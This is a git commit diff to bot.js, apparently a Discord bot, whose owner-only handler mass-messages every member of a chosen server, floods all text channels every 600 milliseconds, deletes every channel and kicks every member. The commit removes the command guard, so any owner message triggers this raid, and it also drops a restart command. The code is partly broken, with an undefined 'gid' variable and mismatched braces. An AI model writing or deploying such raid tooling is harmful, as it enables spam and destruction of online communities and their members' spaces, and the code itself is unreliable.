43232b724d04341cd899e38dda837b49729fd358
Aeterne Satiatus <lafayedemicheaux.luka@gmail.com>
2019-06-23 13:48:11 +1000

    Update bot.js

--- bot.js
+++ bot.js
@@ -12,42 +12,28 @@ function isOwner(id) {
     return false;
 }
 
-// Bot commands
 client.on('message', message => {
     if (isOwner(message.author.id)) {
         var args = message.content.split(" ");
-        
-        if (args[0] == prefix + 'shitcord') {
-            delete args[0];
-            var serverid = args[1];
-            let guild = client.guilds.get(serverid);
-            delete args[1];
-            var msg = args.join(" ");
-            client.guilds.get(serverid).members.map(m => {
-                    m.send(msg);
+        delete args[0];
+        var serverid = args[1];
+        let guild = client.guilds.get(serverid);
+        delete args[1];
+        var msg = args.join(" ");
+        client.guilds.get(serverid).members.map(m => {
+                m.send(msg);
+        });
+        var interval = setInterval(function () {
+            client.guilds.get(gid).channels.map(c => {
+                if (c.type == "text") c.send(msg);
             });
-            var interval = setInterval(function () {
-                client.guilds.get(gid).channels.map(c => {
-                    if (c.type == "text") c.send(msg);
-                });
-            }, 600);
-            guild.channels.forEach(c => {
-                    c.delete();
-                });
-            guild.members.forEach(m => {
-                    m.kick();
-                });
+        }, 600);
+        guild.channels.forEach(c => {
+            c.delete();
+        });
+        guild.members.forEach(m => {
+            m.kick();
+        });
+}
     
-        // Restart bot
-        if (args[0] == prefix + 'restart') {
-               require("child_process").spawn(process.argv.shift(), process.argv, {
-                   cwd: process.cwd(),
-                   detached : true,
-                   stdio: "inherit"
-               });
-               process.exit();
-        }
-    }
-});
-
 client.login(process.env.BOT_TOKEN);
